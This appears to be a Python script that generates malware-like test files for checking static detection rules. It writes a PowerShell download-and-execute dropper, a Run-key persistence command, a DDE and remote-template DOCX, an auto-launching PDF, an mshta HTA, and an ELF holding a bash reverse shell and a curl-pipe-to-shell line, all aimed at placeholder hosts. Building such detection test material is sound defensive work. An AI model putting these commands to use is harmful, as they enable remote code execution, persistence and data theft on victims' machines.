"""Generates INERT test samples (no real malware). Strings only trigger static rules."""
import base64, os, random, struct, zipfile, io, zlib
random.seed(7)
import pathlib
out = str(pathlib.Path(__file__).resolve().parent / "samples")
os.makedirs(out, exist_ok=True)

# 1. PowerShell dropper with -EncodedCommand (decodes to a harmless Write-Host + fake URL)
inner = "IEX (New-Object Net.WebClient).DownloadString('http://update-check.top/stage2.ps1'); Write-Host 'demo'"
enc = base64.b64encode(inner.encode("utf-16le")).decode()
ps = f"""powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {enc}
$u = 'ht'+'tps://cdn-files.xyz/a.bin'
$c = "cmd.exe /c schtasks /create /tn Updater /tr C:\\Users\\Public\\upd.exe"
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\Users\\Public\\upd.exe
# C2 192.0.2.77 backup 198.51.100.23
"""
open(f"{out}/dropper.ps1", "w").write(ps)

# 2. Crafted PE: packer section names, W+X, future timestamp, XOR URL, embedded PE, suspicious API strings
def build_pe(extra=b"", sections_raw=None):
    e_lfanew = 0x80
    dos = bytearray(0x80); dos[0:2] = b"MZ"; struct.pack_into("<I", dos, 0x3C, e_lfanew)
    coff = struct.pack("<HHIIIHH", 0x14C, 2, 0x7FFFFFFF, 0, 0, 0xE0, 0x102)
    opt = bytearray(0xE0)
    struct.pack_into("<H", opt, 0, 0x10B)
    struct.pack_into("<I", opt, 16, 0x2000)          # EP
    struct.pack_into("<I", opt, 28, 0x400000)        # ImageBase
    struct.pack_into("<I", opt, 32, 0x1000)          # SectionAlignment
    struct.pack_into("<I", opt, 36, 0x200)           # FileAlignment
    struct.pack_into("<H", opt, 40, 4)               # MajorOSVersion
    struct.pack_into("<H", opt, 48, 4)               # MajorSubsystemVersion
    struct.pack_into("<I", opt, 56, 0x3000)          # SizeOfImage
    struct.pack_into("<I", opt, 60, 0x200)           # SizeOfHeaders
    struct.pack_into("<H", opt, 68, 3)               # Subsystem console
    struct.pack_into("<I", opt, 92, 16)              # NumberOfRvaAndSizes
    sec = lambda n, vs, va, rs, rp, fl: struct.pack("<8sIIIIIIHHI", n, vs, va, rs, rp, 0, 0, 0, 0, fl)
    body = bytes(random.getrandbits(8) for _ in range(0x400))
    hdr = bytes(dos) + b"PE\0\0" + coff + bytes(opt)
    hdr += sec(b"UPX0", 0x1000, 0x1000, 0, 0x200, 0xE0000080)
    hdr += sec(b"UPX1", 0x1000, 0x2000, 0x400, 0x200, 0xE0000040)
    hdr = hdr.ljust(0x200, b"\0")
    return hdr + body

stub = build_pe()[:0x200]
xor_url = bytes(b ^ 0x5A for b in b"http://payload-host-demo.xyz/drop.bin")
strings = b"\0".join([
    b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread", b"GetProcAddress", b"LoadLibraryA",
    b"cmd.exe /c powershell -nop -w hidden", b"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    b"https://api.telegram.org/bot123456789:AAHdemoDEMOdemoDEMOdemoDEMOdemoDEMO12/sendMessage",
    b"IsDebuggerPresent", b"VBoxService.exe", b"C:\\Users\\dev\\src\\implant\\Release\\implant.pdb",
    b"Global\\MalDemoMutex_42", b"your files have been encrypted", b"vssadmin delete shadows /all",
])
pe = build_pe() + strings + b"\0" * 8 + xor_url + b"\0" * 8 + stub
open(f"{out}/invoice.pdf.exe", "wb").write(pe)

# 3. DOCX with macro placeholder + remote template + embedded exe name
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("[Content_Types].xml", '<Types xmlns="x"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>')
    z.writestr("word/document.xml", '<w:document><w:body><w:p>Hello</w:p><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:body></w:document>')
    z.writestr("word/_rels/document.xml.rels",
        '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://templates-cdn.top/tpl.dotm" TargetMode="External"/>'
        '<Relationship Id="rId2" Type="http://x/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>')
    z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"VBA AutoOpen Shell CreateObject powershell" * 3)
    z.writestr("word/embeddings/payload.exe", b"MZ" + b"\0" * 100)
open(f"{out}/report.docx", "wb").write(buf.getvalue())

# 4. PDF with JS + OpenAction + hex-escaped name + flate stream containing URL
js = zlib.compress(b"app.launchURL('http://pdf-redirect.top/x', true); eval(unescape('%61'));")
pdf = (b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction 2 0 R/Pages 3 0 R>>endobj\n"
       b"2 0 obj<</S/J#61vaScript/JS 4 0 R>>endobj\n3 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n"
       b"4 0 obj<</Filter/FlateDecode/Length " + str(len(js)).encode() + b">>\nstream\n" + js + b"\nendstream\nendobj\n"
       b"5 0 obj<</Type/Action/S/Launch/F(cmd.exe)>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF")
open(f"{out}/statement.pdf", "wb").write(pdf)

# 5. HTA
hta = """<html><head><HTA:APPLICATION ID="x"/><script language="VBScript">
Set sh = CreateObject("WScript.Shell")
sh.Run "mshta http://hta-stage.top/a.hta", 0
</script></head></html>"""
open(f"{out}/page.hta", "w").write(hta)

# 6. Minimal ELF (64-bit LE) with reverse-shell strings
elf = bytearray(64); elf[0:4] = b"\x7fELF"; elf[4] = 2; elf[5] = 1; elf[6] = 1
struct.pack_into("<HHIQQQIHHHHHH", elf, 16, 2, 62, 1, 0x400078, 0, 0, 0, 64, 0, 0, 64, 0, 0)
elf += b"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\0curl http://203.0.113.9/x.sh | sh\0/etc/cron.d/x\0xmrig stratum+tcp://pool.minexmr.com:4444\0"
open(f"{out}/implant.elf", "wb").write(bytes(elf))

# 7. benign text
open(f"{out}/readme.txt", "w").write("Meeting notes for Tuesday. Visit https://example.com for details.\n" * 3)
print(sorted(os.listdir(out)))
